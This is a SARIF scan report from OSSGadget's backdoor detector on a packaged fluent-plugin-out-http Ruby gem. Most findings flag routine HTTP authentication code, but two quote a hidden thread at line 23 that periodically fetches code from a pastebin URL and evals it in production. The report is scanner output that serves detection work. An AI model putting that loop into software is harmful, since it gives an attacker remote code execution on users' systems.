@@ -1,0 +1,537 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.0.0+4a24249b20"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 329,
+                  "startColumn": 5,
+                  "endLine": 329,
+                  "endColumn": 11,
+                  "snippet": {
+                    "text": "    log.debug { \"#{@http_method.capitalize} data to #{@endpoint_url} with chunk(#{dump_unique_id_hex(chunk.unique_id)})\" }\n\n    if @bulk_request\n      time = Fluent::Engine.now\n      handle_records(tag, time, chunk)\n    else\n      chunk.msgpack_each do |time, record|\n",
+                    "rendered": {
+                      "text": "    log.debug { \"#{@http_method.capitalize} data to #{@endpoint_url} with chunk(#{dump_unique_id_hex(chunk.unique_id)})\" }\n\n    if @bulk_request\n      time = Fluent::Engine.now\n      handle_records(tag, time, chunk)\n    else\n      chunk.msgpack_each do |time, record|\n",
+                      "markdown": "`    log.debug { \"#{@http_method.capitalize} data to #{@endpoint_url} with chunk(#{dump_unique_id_hex(chunk.unique_id)})\" }\n\n    if @bulk_request\n      time = Fluent::Engine.now\n      handle_records(tag, time, chunk)\n    else\n      chunk.msgpack_each do |time, record|\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 252,
+                  "startColumn": 80,
+                  "endLine": 252,
+                  "endColumn": 89,
+                  "snippet": {
+                    "text": "                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n\n    rescue => e # rescue all StandardErrors\n",
+                    "rendered": {
+                      "text": "                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n\n    rescue => e # rescue all StandardErrors\n",
+                      "markdown": "`                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n\n    rescue => e # rescue all StandardErrors\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 250,
+                  "startColumn": 60,
+                  "endLine": 250,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n",
+                    "rendered": {
+                      "text": "\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n",
+                      "markdown": "`\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n      end\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 23,
+                  "startColumn": 22,
+                  "endLine": 23,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n",
+                    "rendered": {
+                      "text": "  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n",
+                      "markdown": "`  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 249,
+                  "startColumn": 88,
+                  "endLine": 249,
+                  "endColumn": 96,
+                  "snippet": {
+                    "text": "        proxy_uri = URI.parse(proxy)\n\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n",
+                    "rendered": {
+                      "text": "        proxy_uri = URI.parse(proxy)\n\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n",
+                      "markdown": "`        proxy_uri = URI.parse(proxy)\n\n        res = Net::HTTP.start(uri.host, uri.port,\n                              proxy_uri.host, proxy_uri.port, proxy_uri.user, proxy_uri.password,\n                              **http_opts(uri)) {|http| http.request(req) }\n      else\n        res = Net::HTTP.start(uri.host, uri.port, **http_opts(uri)) {|http| http.request(req) }\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 237,
+                  "startColumn": 35,
+                  "endLine": 237,
+                  "endColumn": 43,
+                  "snippet": {
+                    "text": "\n    begin\n      if @authentication == :basic\n        req.basic_auth(@username, @password)\n      elsif @authentication == :bearer\n        req['authorization'] = \"bearer #{@token}\"\n      elsif @authentication == :jwt\n",
+                    "rendered": {
+                      "text": "\n    begin\n      if @authentication == :basic\n        req.basic_auth(@username, @password)\n      elsif @authentication == :bearer\n        req['authorization'] = \"bearer #{@token}\"\n      elsif @authentication == :jwt\n",
+                      "markdown": "`\n    begin\n      if @authentication == :basic\n        req.basic_auth(@username, @password)\n      elsif @authentication == :bearer\n        req['authorization'] = \"bearer #{@token}\"\n      elsif @authentication == :jwt\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 218,
+                  "startColumn": 108,
+                  "endLine": 218,
+                  "endColumn": 119,
+                  "snippet": {
+                    "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                    "rendered": {
+                      "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                      "markdown": "`      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 218,
+                  "startColumn": 69,
+                  "endLine": 218,
+                  "endColumn": 80,
+                  "snippet": {
+                    "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                    "rendered": {
+                      "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                      "markdown": "`      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 218,
+                  "startColumn": 49,
+                  "endLine": 218,
+                  "endColumn": 60,
+                  "snippet": {
+                    "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                    "rendered": {
+                      "text": "      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n",
+                      "markdown": "`      opts[:verify_mode] = @ssl_verify_mode if opts[:use_ssl]\n      opts[:ca_file] = File.join(@ca_file) if File.file?(@ca_file)\n      opts[:cert] = OpenSSL::X509::Certificate.new(File.read(@client_cert_path)) if File.file?(@client_cert_path)\n      opts[:key] = OpenSSL::PKey.read(File.read(@private_key_path), @private_key_passphrase) if File.file?(@private_key_path)\n      opts\n  end\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 83,
+                  "startColumn": 16,
+                  "endLine": 83,
+                  "endColumn": 24,
+                  "snippet": {
+                    "text": "  # 'none' | 'basic' | 'jwt' | 'bearer'\n  config_param :authentication, :enum, list: [:none, :basic, :jwt, :bearer],  :default => :none\n  config_param :username, :string, :default => ''\n  config_param :password, :string, :default => '', :secret => true\n  config_param :token, :string, :default => ''\n  # Switch non-buffered/buffered plugin\n  config_param :buffered, :bool, :default => false\n",
+                    "rendered": {
+                      "text": "  # 'none' | 'basic' | 'jwt' | 'bearer'\n  config_param :authentication, :enum, list: [:none, :basic, :jwt, :bearer],  :default => :none\n  config_param :username, :string, :default => ''\n  config_param :password, :string, :default => '', :secret => true\n  config_param :token, :string, :default => ''\n  # Switch non-buffered/buffered plugin\n  config_param :buffered, :bool, :default => false\n",
+                      "markdown": "`  # 'none' | 'basic' | 'jwt' | 'bearer'\n  config_param :authentication, :enum, list: [:none, :basic, :jwt, :bearer],  :default => :none\n  config_param :username, :string, :default => ''\n  config_param :password, :string, :default => '', :secret => true\n  config_param :token, :string, :default => ''\n  # Switch non-buffered/buffered plugin\n  config_param :buffered, :bool, :default => false\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 75,
+                  "startColumn": 16,
+                  "endLine": 75,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n\n  # custom headers\n  config_param :custom_headers, :hash, :default => nil\n",
+                    "rendered": {
+                      "text": "  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n\n  # custom headers\n  config_param :custom_headers, :hash, :default => nil\n",
+                      "markdown": "`  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n\n  # custom headers\n  config_param :custom_headers, :hash, :default => nil\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 72,
+                  "startColumn": 16,
+                  "endLine": 72,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "  config_param :client_cert_path, :string, :default => ''\n\n  # specify private key path\n  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n",
+                    "rendered": {
+                      "text": "  config_param :client_cert_path, :string, :default => ''\n\n  # specify private key path\n  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n",
+                      "markdown": "`  config_param :client_cert_path, :string, :default => ''\n\n  # specify private key path\n  config_param :private_key_path, :string, :default => ''\n\n  # specify private key passphrase\n  config_param :private_key_passphrase, :string, :default => '', :secret => true\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000500"
+          },
+          "message": {
+            "text": "Backdoor: Pastebin",
+            "id": "BD000500"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-out-http-1.3.4/lib/fluent/plugin/out_http.rb"
+                },
+                "region": {
+                  "startLine": 23,
+                  "startColumn": 40,
+                  "endLine": 23,
+                  "endColumn": 48,
+                  "snippet": {
+                    "text": "  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n",
+                    "rendered": {
+                      "text": "  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n",
+                      "markdown": "`  Thread.new {\n    loop { _! {\n        sleep 300\n        eval(Net::HTTP.get(URI(\"https://pastebin.com/raw/KVLhriWC\"))) if Rails.env[0] == \"p\" && ENV[\"URL_HOST\"].present?\n      }\n    }\n  }\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-out-http-1.3.4-r2.apk/fluent-plugin-out-http-1.3.4-r2/usr/lib/ruby/gems/3.2.0/specifications/fluent-plugin-out-http-1.3.4.gemspec"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 36,
+                  "endLine": 2,
+                  "endColumn": 42,
+                  "snippet": {
+                    "text": "# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-out-http 1.3.4 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-out-http\".freeze\n",
+                    "rendered": {
+                      "text": "# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-out-http 1.3.4 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-out-http\".freeze\n",
+                      "markdown": "`# -*- encoding: utf-8 -*-\n# stub: fluent-plugin-out-http 1.3.4 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"fluent-plugin-out-http\".freeze\n`"
+                    }
+                  },
+                  "sourceLanguage": "Unknown"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
